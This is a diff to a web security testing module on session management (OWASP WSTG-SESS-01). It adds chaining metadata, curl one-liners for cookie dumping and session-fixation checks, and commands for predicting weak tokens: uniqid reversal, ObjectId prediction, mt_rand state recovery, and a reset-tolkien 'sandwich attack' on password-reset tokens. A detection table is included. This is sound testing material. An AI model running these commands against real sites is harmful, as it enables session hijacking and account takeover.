@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [session, cookies, csrf, token, wstg, sess]
 tech_stack: [cookies, jwt, session]
 cwe_ids: [CWE-539]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-sess-02, wstg-sess-03]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-sess-02: "Predictable session ID + missing Secure/HttpOnly flags = trivial hijacking via both token prediction and XSS/network theft (Critical)"
+  wstg-sess-03: "Schema accepts externally-supplied session IDs + confirmed fixation on login = attacker-preset session persists post-auth for direct account takeover (Critical)"
 ---
 
 # wstg-sess-01
@@ -488,6 +490,79 @@ analyzer.generate_report()
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Quick session token dump (name + value + flags) in one line
+curl -sI "https://{target}/login" | grep -i 'set-cookie' | tee /tmp/cookies.txt
+
+# Pull raw entropy score with ent (apt install ent)
+for i in {1..30}; do curl -s -c - "https://{target}/" | awk '/SESSIONID/{print $7}'; done > tokens.txt
+ent tokens.txt   # look for "Entropy = X bits per byte" — flag if far below 8
+
+# Session-fixation one-liner: does the ID survive login?
+PRE=$(curl -s -c - "https://{target}/" | awk '/SESSIONID/{print $7}')
+curl -s -b "SESSIONID=$PRE" -c - "https://{target}/login" -d "user=test&pass=test" | grep SESSIONID
+# [VULN] if the SESSIONID value in the response matches $PRE exactly
+
+# Force-accept an attacker-chosen ID via URL/GET param (schema flaw)
+curl -s -I "https://{target}/?SESSIONID=ATTACKER-CONTROLLED-0001"
+```
+
+Identifying and exploiting the *generator* behind a weak/predictable token (when the schema turns out to be a GUID, ObjectId, `uniqid()`, or a time-seeded PRNG instead of a CSPRNG):
+
+```bash
+# Time-seeded token: if the app seeds Python/PHP rand() with time(), the token is
+# reproducible for anyone who knows (or brackets) the issuance timestamp
+python3 -c "
+import random, time
+seed = int(time.mktime(time.strptime('2026-08-19 13:37', '%Y-%m-%d %H:%M')))
+random.seed(seed)
+print(random.randint(1, 100))
+"
+
+# Session/reset-token looks like a UUID -> fingerprint the version (v1 = time+MAC based = predictable)
+# xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx  (M = version nibble)
+guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00
+# -> UUID version, timestamp, MAC/node, clock sequence disclosed if version 1
+
+# MongoDB ObjectId-based token: 4-byte timestamp + 3-byte machine + 2-byte PID + 3-byte counter,
+# counter increments sequentially -> next/prior IDs are predictable from one sample
+./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
+# -> 5ae9bac82c144b9def01ec39, 5ae9bacf2c144b9def01ec3a, ...
+
+# PHP/uniqid()-based token (13 hex chars = seconds.microseconds) — trivially reversible
+python3 -c "
+def reverse_uniqid(v):
+    return float(f'{int(v[:8],16)}.{int(v[8:],16)}')
+print(reverse_uniqid('6659cea087cd6'))
+"
+
+# mt_rand()-derived token — recover the internal PRNG state from two outputs, no bruteforce
+./display_mt_rand.php 12345678 123
+./reverse_mt_rand.py 712530069 674417379 123 1
+
+# Custom/home-grown token algorithms seen in the wild — worth grepping source/JS bundles for:
+#   md5($emailId).rand(10,9999)
+#   md5(time()+123456789 % rand(4000,55000000))
+
+# "Sandwich attack" against a time-based secret (e.g. password-reset token): bracket the
+# token's issuance between two known timestamps and brute the narrow window instead of the full keyspace
+reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "victim@{target}" --suffixes "victim@{target}" --timezone "-7"
+reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format="uniqid"
+```
+
+| Detection Pattern | Meaning |
+| --- | --- |
+| `Entropy = 8.00 bits per byte` (via `ent`) | Strong randomness — OK |
+| `Entropy < 6` bits/byte | [VULN] Predictable token generator |
+| Response reuses attacker-supplied `SESSIONID` post-login | [VULN] Session schema accepts externally-set IDs |
+| Token length < 16 chars or numeric-only | [VULN] Weak schema, brute-forceable |
+| Token is a v1 GUID/UUID, ObjectId, or `uniqid()` output | [VULN] Structurally predictable (time/MAC/counter based), not a CSPRNG |
+| Two token samples let `mt_rand`/time-seeded PRNG state be recovered | [VULN] Insecure Randomness, tokens forgeable — CWE-330 |
+
+---
+
 ## Remediation Guide
 
 ### 1. Secure Session Generation
@@ -628,6 +703,7 @@ class SessionValidator:
 - [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 - [OWASP WSTG - Session Management Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/)
 - [RFC 6265 - HTTP State Management](https://tools.ietf.org/html/rfc6265)
+- [PayloadsAllTheThings - Insecure Randomness](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Randomness)
 
 
 ---
